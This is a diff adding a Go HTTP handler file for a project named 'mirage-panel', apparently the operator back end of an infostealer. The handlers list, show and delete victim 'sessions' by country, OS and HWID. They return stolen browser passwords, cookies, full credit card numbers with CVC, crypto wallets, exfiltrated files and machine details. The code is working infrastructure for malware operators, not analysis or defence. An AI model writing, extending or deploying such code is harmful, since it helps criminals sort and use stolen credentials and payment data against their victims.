@@ -1,0 +1,370 @@
+package api
+
+import (
+	"database/sql"
+	"fmt"
+	"net/http"
+	"strconv"
+	"strings"
+
+	"github.com/go-chi/chi/v5"
+	"github.com/user/mirage-panel/internal/db"
+)
+
+var allowedSorts = map[string]string{
+	"created_at": "s.created_at",
+	"os":         "s.os",
+	"ip":         "s.ip",
+	"country":    "s.country_code",
+}
+
+type SessionsHandler struct {
+	db *sql.DB
+}
+
+func NewSessionsHandler(db *sql.DB) *SessionsHandler {
+	return &SessionsHandler{db: db}
+}
+
+type SessionListItem struct {
+	ID             string `json:"id"`
+	BuildID        string `json:"build_id,omitempty"`
+	Hwid           string `json:"hwid,omitempty"`
+	Os             string `json:"os,omitempty"`
+	Username       string `json:"username,omitempty"`
+	Ip             string `json:"ip,omitempty"`
+	CountryCode    string `json:"country_code,omitempty"`
+	CreatedAt      string `json:"created_at"`
+	PasswordsCount int    `json:"passwords_count"`
+	CookiesCount   int    `json:"cookies_count"`
+	CardsCount     int    `json:"cards_count"`
+	WalletsCount   int    `json:"wallets_count"`
+	FilesCount     int    `json:"files_count"`
+}
+
+type SessionDetailResponse struct {
+	ID          string          `json:"id"`
+	BuildID     string          `json:"build_id,omitempty"`
+	Hwid        string          `json:"hwid,omitempty"`
+	Os          string          `json:"os,omitempty"`
+	Username    string          `json:"username,omitempty"`
+	Ip          string          `json:"ip,omitempty"`
+	CountryCode string          `json:"country_code,omitempty"`
+	CreatedAt   string          `json:"created_at"`
+	Passwords   []db.Password   `json:"passwords"`
+	Cookies     []db.Cookie     `json:"cookies"`
+	Cards       []db.Card       `json:"cards"`
+	Wallets     []db.Wallet     `json:"wallets"`
+	Files       []db.StolenFile `json:"files"`
+	SystemInfo  *db.SystemInfo  `json:"system_info"`
+}
+
+func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
+	page, _ := strconv.Atoi(r.URL.Query().Get("page"))
+	if page < 1 {
+		page = 1
+	}
+
+	limit, _ := strconv.Atoi(r.URL.Query().Get("limit"))
+	if limit < 1 || limit > 100 {
+		limit = 50
+	}
+
+	sort := r.URL.Query().Get("sort")
+	if sort == "" {
+		sort = "-created_at"
+	}
+
+	var conditions []string
+	var args []any
+
+	if country := r.URL.Query().Get("country"); country != "" {
+		conditions = append(conditions, "s.country_code = ?")
+		args = append(args, country)
+	}
+	if os := r.URL.Query().Get("os"); os != "" {
+		conditions = append(conditions, "s.os = ?")
+		args = append(args, os)
+	}
+	if hwid := r.URL.Query().Get("hwid"); hwid != "" {
+		conditions = append(conditions, "s.hwid = ?")
+		args = append(args, hwid)
+	}
+	if q := r.URL.Query().Get("q"); q != "" {
+		like := "%" + q + "%"
+		conditions = append(conditions, "(s.ip LIKE ? OR s.os LIKE ? OR s.username LIKE ? OR s.hwid LIKE ?)")
+		args = append(args, like, like, like, like)
+	}
+
+	where := ""
+	if len(conditions) > 0 {
+		where = "WHERE " + strings.Join(conditions, " AND ")
+	}
+
+	countQuery := "SELECT COUNT(*) FROM sessions s " + where
+	var total int
+	if err := h.db.QueryRow(countQuery, args...).Scan(&total); err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to count sessions")
+		return
+	}
+
+	var orderClause string
+	if len(sort) > 0 {
+		dir := "ASC"
+		field := sort
+		if sort[0] == '-' {
+			dir = "DESC"
+			field = sort[1:]
+		} else if sort[0] == '+' || sort[0] == ' ' {
+			field = sort[1:]
+		}
+		if col, ok := allowedSorts[field]; ok {
+			orderClause = fmt.Sprintf("ORDER BY %s %s", col, dir)
+		} else {
+			writeError(w, http.StatusBadRequest, "invalid sort field")
+			return
+		}
+	}
+
+	offset := (page - 1) * limit
+
+	query := fmt.Sprintf(`
+		SELECT s.id, s.build_id, s.hwid, s.os, s.username, s.ip,
+		       s.country_code, s.created_at,
+		       (SELECT COUNT(*) FROM passwords p WHERE p.session_id = s.id),
+		       (SELECT COUNT(*) FROM cookies c WHERE c.session_id = s.id),
+		       (SELECT COUNT(*) FROM cards c WHERE c.session_id = s.id),
+		       (SELECT COUNT(*) FROM wallets w WHERE w.session_id = s.id),
+		       (SELECT COUNT(*) FROM stolen_files f WHERE f.session_id = s.id)
+		FROM sessions s %s %s LIMIT ? OFFSET ?`, where, orderClause)
+
+	queryArgs := make([]any, len(args)+2)
+	copy(queryArgs, args)
+	queryArgs[len(args)] = limit
+	queryArgs[len(args)+1] = offset
+
+	rows, err := h.db.Query(query, queryArgs...)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to query sessions")
+		return
+	}
+	defer rows.Close()
+
+	items := make([]SessionListItem, 0)
+	for rows.Next() {
+		var item SessionListItem
+		if err := rows.Scan(
+			&item.ID, &item.BuildID, &item.Hwid, &item.Os, &item.Username,
+			&item.Ip, &item.CountryCode, &item.CreatedAt,
+			&item.PasswordsCount, &item.CookiesCount, &item.CardsCount,
+			&item.WalletsCount, &item.FilesCount,
+		); err != nil {
+			writeError(w, http.StatusInternalServerError, "failed to scan session row")
+			return
+		}
+		items = append(items, item)
+	}
+	if err := rows.Err(); err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to iterate session rows")
+		return
+	}
+
+	pages := (total + limit - 1) / limit
+
+	writeJSON(w, http.StatusOK, map[string]any{
+		"items": items,
+		"total": total,
+		"page":  page,
+		"limit": limit,
+		"pages": pages,
+	})
+}
+
+func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request) {
+	id := chi.URLParam(r, "id")
+
+	var s struct {
+		ID          string
+		BuildID     string
+		Hwid        string
+		Os          string
+		Username    string
+		Ip          string
+		CountryCode string
+		CreatedAt   string
+	}
+	err := h.db.QueryRow(`
+		SELECT id, build_id, hwid, os, username, ip, country_code, created_at
+		FROM sessions WHERE id = ?`, id).Scan(
+		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
+		&s.Ip, &s.CountryCode, &s.CreatedAt,
+	)
+	if err == sql.ErrNoRows {
+		writeError(w, http.StatusNotFound, "session not found")
+		return
+	}
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to fetch session")
+		return
+	}
+
+	passwords := queryPasswords(h.db, id)
+	cookies := queryCookies(h.db, id)
+	cards := queryCards(h.db, id)
+	wallets := queryWallets(h.db, id)
+	files := queryFiles(h.db, id)
+	sysInfo := querySystemInfo(h.db, id)
+
+	resp := SessionDetailResponse{
+		ID:          s.ID,
+		BuildID:     s.BuildID,
+		Hwid:        s.Hwid,
+		Os:          s.Os,
+		Username:    s.Username,
+		Ip:          s.Ip,
+		CountryCode: s.CountryCode,
+		CreatedAt:   s.CreatedAt,
+		Passwords:   passwords,
+		Cookies:     cookies,
+		Cards:       cards,
+		Wallets:     wallets,
+		Files:       files,
+		SystemInfo:  sysInfo,
+	}
+
+	writeJSON(w, http.StatusOK, resp)
+}
+
+func (h *SessionsHandler) Delete(w http.ResponseWriter, r *http.Request) {
+	id := chi.URLParam(r, "id")
+
+	result, err := h.db.Exec("DELETE FROM sessions WHERE id = ?", id)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to delete session")
+		return
+	}
+
+	rows, err := result.RowsAffected()
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to check deletion result")
+		return
+	}
+
+	if rows == 0 {
+		writeError(w, http.StatusNotFound, "session not found")
+		return
+	}
+
+	writeJSON(w, http.StatusOK, map[string]string{"message": "session deleted"})
+}
+
+func queryPasswords(d *sql.DB, sessionID string) []db.Password {
+	rows, err := d.Query(
+		"SELECT id, session_id, url, username, password_value, browser FROM passwords WHERE session_id = ?",
+		sessionID)
+	if err != nil {
+		return []db.Password{}
+	}
+	defer rows.Close()
+
+	var result []db.Password
+	for rows.Next() {
+		var p db.Password
+		if rows.Scan(&p.ID, &p.SessionID, &p.Url, &p.Username, &p.PasswordValue, &p.Browser) == nil {
+			result = append(result, p)
+		}
+	}
+	return result
+}
+
+func queryCookies(d *sql.DB, sessionID string) []db.Cookie {
+	rows, err := d.Query(
+		"SELECT id, session_id, domain, name, value, path FROM cookies WHERE session_id = ?",
+		sessionID)
+	if err != nil {
+		return []db.Cookie{}
+	}
+	defer rows.Close()
+
+	var result []db.Cookie
+	for rows.Next() {
+		var c db.Cookie
+		if rows.Scan(&c.ID, &c.SessionID, &c.Domain, &c.Name, &c.Value, &c.Path) == nil {
+			result = append(result, c)
+		}
+	}
+	return result
+}
+
+func queryCards(d *sql.DB, sessionID string) []db.Card {
+	rows, err := d.Query(
+		"SELECT id, session_id, number, exp_month, exp_year, holder, cvc FROM cards WHERE session_id = ?",
+		sessionID)
+	if err != nil {
+		return []db.Card{}
+	}
+	defer rows.Close()
+
+	var result []db.Card
+	for rows.Next() {
+		var c db.Card
+		if rows.Scan(&c.ID, &c.SessionID, &c.Number, &c.ExpMonth, &c.ExpYear, &c.Holder, &c.Cvc) == nil {
+			result = append(result, c)
+		}
+	}
+	return result
+}
+
+func queryWallets(d *sql.DB, sessionID string) []db.Wallet {
+	rows, err := d.Query(
+		"SELECT id, session_id, name, path FROM wallets WHERE session_id = ?",
+		sessionID)
+	if err != nil {
+		return []db.Wallet{}
+	}
+	defer rows.Close()
+
+	var result []db.Wallet
+	for rows.Next() {
+		var w db.Wallet
+		if rows.Scan(&w.ID, &w.SessionID, &w.Name, &w.Path) == nil {
+			result = append(result, w)
+		}
+	}
+	return result
+}
+
+func queryFiles(d *sql.DB, sessionID string) []db.StolenFile {
+	rows, err := d.Query(
+		"SELECT id, session_id, filename, size FROM stolen_files WHERE session_id = ?",
+		sessionID)
+	if err != nil {
+		return []db.StolenFile{}
+	}
+	defer rows.Close()
+
+	var result []db.StolenFile
+	for rows.Next() {
+		var f db.StolenFile
+		if rows.Scan(&f.ID, &f.SessionID, &f.Filename, &f.Size) == nil {
+			result = append(result, f)
+		}
+	}
+	return result
+}
+
+func querySystemInfo(d *sql.DB, sessionID string) *db.SystemInfo {
+	var info db.SystemInfo
+	err := d.QueryRow(`
+		SELECT session_id, cpu, gpu, ram, os, screen, hostname, local_ip,
+		       mac, public_ip, hwid, uptime
+		FROM system_info WHERE session_id = ?`, sessionID).Scan(
+		&info.SessionID, &info.Cpu, &info.Gpu, &info.Ram, &info.Os,
+		&info.Screen, &info.Hostname, &info.LocalIp, &info.Mac,
+		&info.PublicIP, &info.Hwid, &info.Uptime,
+	)
+	if err != nil {
+		return nil
+	}
+	return &info
+}
